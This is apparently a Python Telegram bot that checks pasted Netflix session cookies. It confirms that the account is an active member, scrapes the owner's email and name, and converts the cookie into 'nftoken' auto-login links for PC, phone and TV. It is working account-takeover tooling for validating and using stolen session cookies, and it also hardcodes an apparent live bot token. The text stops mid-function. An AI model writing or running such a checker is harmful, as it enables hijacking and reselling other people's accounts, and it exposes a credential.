import re
import json
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types
import traceback

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def load_cookies(text):
    text = text.strip()
    if not text: return {}

    cookies = {}

    # Extract NetflixId and SecureNetflixId
    match = re.search(r'NetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["NetflixId"] = match.group(1)

    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["SecureNetflixId"] = match.group(1)

    # Fallback split
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k and v and len(v) > 10:
                cookies[k] = v

    return cookies

_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {"appVersion": "15.48.1", "responseFormat": "json"}
_IOS_HEADERS = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)"}

def generate_nftoken(netflix_id):
    if not netflix_id: return None
    try:
        headers = dict(_IOS_HEADERS)
        headers["Cookie"] = f"NetflixId={netflix_id}"
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=15, verify=False)
        if r.status_code == 200:
            data = r.json()
            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies):
    try:
        if not cookies.get("NetflixId"):
            return None

        sess = requests.Session()
        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        for k, v in cookies.items():
            sess.cookies.set(k, v, domain=".netflix.com")

        r = sess.get("https://www.netflix.com/account", timeout=20, allow_redirects=True)
        if "login" in r.url.lower() or r.status_code in (401, 403):
            return None

        html = r.text
        if '"membershipStatus":"CURRENT_MEMBER"' not in html:
            return None

        email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
        name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or "User"

        nftoken = generate_nftoken(cookies.get("NetflixId"))

        if nftoken:
            safe = urllib.parse.quote(nftoken)
            login_pc = f"https://netflix.com/?nftoken={safe}"
            login_phone = f"https://netflix.com/unsupported?nftoken={safe}"
        else:
            login_pc = login_phone = "N/A (No Token)"

        return {
            "email": email or "N/A",
            "name": name,
            "login_pc": login_pc,
            "login_phone": login_phone,
            "login_tv": "https://www.netflix.com/tv2"
        }
    except Exception as e:
        print("Check Error:", str(e))
        return None

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

# ================== BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, "👋 Send your Netflix cookie (paste or .txt file)", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste your full cookie now:")
        return

    try
